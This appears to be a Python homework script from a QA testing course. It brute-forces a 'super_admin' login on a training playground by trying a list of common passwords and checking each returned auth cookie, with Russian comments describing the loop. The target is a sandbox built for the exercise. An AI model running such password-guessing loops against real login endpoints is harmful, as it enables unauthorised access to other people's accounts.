# import requests
# import time
# import json
#
# responeses = requests.get('https://playground.learnqa.ru/ajax/api/longtime_job')
# response_text = responeses.text
# print(response_text)
# obj = json.loads(response_text)
#
# key = obj['token']
#
# responeses1 = requests.get('https://playground.learnqa.ru/ajax/api/longtime_job', params = {"token":"wMyojN0ozMxACOw0SNw0iMyAjM"})
# print(responeses1.text)


import requests


class PasswordParsing:


    passwords = {'123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345',
             'iloveyou', '111111', '123123', 'abc123', 'qwerty123',
             '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely', '7777777',
             'welcome', '888888', 'princess', 'dragon', 'password1', '123qwe', '123456',
        'password', '123456789','12345678', '12345', '111111', '1234567', 'sunshine', 'qwerty', 'iloveyou',
             'admin', 'welcome', 'monkey', 'login', 'abc123', 'starwars', '123123',
             'dragon', 'passw0rd', 'master', 'hello', 'freedom', 'whatever', 'qazwsx', 'trustno1'}



    # print(responses.text)
    """ФУКНЦИЯ ОБРАЩАЕТСЯ К АПИ АВТОРИЗАЦИИ и вводит в них поочередно пароль, логин известен заранее, 
    ПОЛУЧАЕТ КУКИ, ВОЗВРАЩАЕТ ИХ В МЕТОД COOKIES.VALUE, после self.cookies приводит куки к списку,
    далее этот куки передается методом POST в API check_auth_cookie, 
    далее идет проверка, ЕСЛИ АВТОРИЗАЦИЯ НЕ ПРОХОДИТ, ТО ПЕРЕБОР ПАРОЛЕЙ ИДЕТ ДАЛЬШЕ
        ЕСЛИ АВТОРИЗАЦИЯ ПРОХОДИТ, ТО ПРИХОДИТ СООБЩЕНИЕ С ПАРОЛЕМ И СООБЩЕНИЕМ ОБ АВТОРИЗАЦИИ"""


    def check_password_scrypt(self):
        for i in PasswordParsing.passwords:
            self.responses = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                           data={"login": "super_admin", "password": i})
            self.cookies_value = self.responses.cookies.get('auth_cookie')
            self.cookies = {'auth_cookie': self.cookies_value}
            self.response_check_cookie = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                                                       cookies=self.cookies)
            if self.response_check_cookie.text == "You are NOT authorized":
                continue
            else:
                print('ВАШ ПАРОЛЬ, СЭР')
                print(i, f"{self.response_check_cookie.text}")

b = PasswordParsing()
b.check_password_scrypt()